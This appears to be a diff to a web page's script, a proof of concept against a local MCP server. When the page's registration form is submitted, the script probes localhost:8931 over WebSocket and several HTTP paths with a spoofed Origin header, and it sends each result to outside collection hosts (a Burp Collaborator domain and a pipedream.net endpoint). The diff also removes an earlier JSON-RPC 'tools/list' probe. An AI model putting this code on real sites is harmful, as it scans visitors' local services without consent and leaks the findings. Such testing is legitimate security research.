@@ -96,57 +96,86 @@
     </div>
 
     <script>
-        const COLLABORATOR = 'x751urew4xtk91cek7r1h59yppvhj77w.oastify.com';
+        const COLLABORATOR = 'https://eoacgy0dwyrv5xq.m.pipedream.net/';
 
-        async function sendToBurp(status, contentType) {
+        async function sendToBurp(testType, result, details) {
             try {
-                // Sending detailed data to Burp Collaborator
-                const url = `https://${COLLABORATOR}?status=${encodeURIComponent(status)}&type=${encodeURIComponent(contentType)}`;
-                await fetch(url, { mode: 'no-cors' }); 
+                const url = `${COLLABORATOR}?test=${encodeURIComponent(testType)}&res=${encodeURIComponent(result)}&det=${encodeURIComponent(details)}`;
+                await fetch(url, { mode: 'no-cors', cache: 'no-cache' });
             } catch (e) {
-                console.log("Failed to contact collaborator", e);
+                console.log("Burp fail", e);
+            }
+        }
+
+        async function testWebSocket() {
+            sendToBurp('WEBSOCKET', 'STARTING', 'Testing ws://localhost:8931');
+            
+            try {
+                const ws = new WebSocket('ws://localhost:8931');
+                
+                // Set a timeout for connection
+                const timeout = setTimeout(() => {
+                    ws.close();
+                    sendToBurp('WEBSOCKET', 'TIMEOUT', 'Connection hung > 2s (Port likely open)');
+                }, 2000);
+
+                ws.onopen = () => {
+                    clearTimeout(timeout);
+                    sendToBurp('WEBSOCKET', 'SUCCESS', 'WebSocket Handshake OK');
+                    ws.close();
+                };
+
+                ws.onerror = () => {
+                    clearTimeout(timeout);
+                    sendToBurp('WEBSOCKET', 'FAILED', 'WebSocket rejected connection');
+                };
+
+            } catch (e) {
+                sendToBurp('WEBSOCKET', 'EXCEPTION', e.message);
+            }
+        }
+
+        async function testHTTPPaths() {
+            const paths = ['/', '/tools', '/rpc', '/mcp', '/health', '/status'];
+            
+            for (const path of paths) {
+                const url = `http://localhost:8931${path}`;
+                sendToBurp('HTTP', 'STARTING', `Testing ${url}`);
+                
+                // Short timeout (1s) to distinguish "Closed Port" from "Open Port"
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1000);
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'GET', 
+                        mode: 'no-cors',
+                        headers: {
+                            'Origin': 'http://paystream.cc' // The CVE Test
+                        },
+                        signal: controller.signal
+                    });
+                    
+                    // If we get here, the connection was established
+                    sendToBurp('HTTP', 'OPEN_PORT', `Port reached at ${path}`);
+                } catch (error) {
+                    if (error.name === 'AbortError') {
+                        sendToBurp('HTTP', 'TIMEOUT', `No response from ${path} (likely closed)`);
+                    } else {
+                        sendToBurp('HTTP', 'FAILED', `Connection failed: ${error.message}`);
+                    }
+                }
             }
         }
 
         async function runTests() {
-            const mcpUrl = 'http://localhost:8931/mcp';
-            const options = {
-                method: 'POST',
-                headers: {
-                    'Origin': 'http://paystream.cc',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    jsonrpc: "2.0",
-                    id: 1,
-                    method: "tools/list"
-                })
-            };
+            sendToBurp('TEST_START', 'RUNNING', 'Starting MCP Tests');
+            
+            // Run WebSocket Test
+            testWebSocket();
 
-            let statusCode = 'CONNECTION_ERROR';
-            let contentType = 'unknown';
-
-            try {
-                const response = await fetch(mcpUrl, options);
-                statusCode = response.status;
-                contentType = response.headers.get('content-type') || 'unknown';
-
-                // Determine Vulnerability Status
-                if (statusCode === 401 || statusCode === 403) {
-                    statusCode = 'SECURE: 403/401 Rejected';
-                } else if (statusCode === 200) {
-                    statusCode = 'VULN: 200 Accepted';
-                }
-            } catch (error) {
-                statusCode = 'NETWORK_FAIL';
-            }
-
-            sendToBurp(statusCode, contentType);
-
-            // Optional: Run other tests silently
-            try {
-                await fetch('http://localhost:8082', { mode: 'no-cors' });
-            } catch (e) {}
+            // Run HTTP Tests after a small delay to avoid overwhelming the server
+            setTimeout(testHTTPPaths, 500);
         }
 
         document.getElementById('regForm').addEventListener('submit', function(e) {
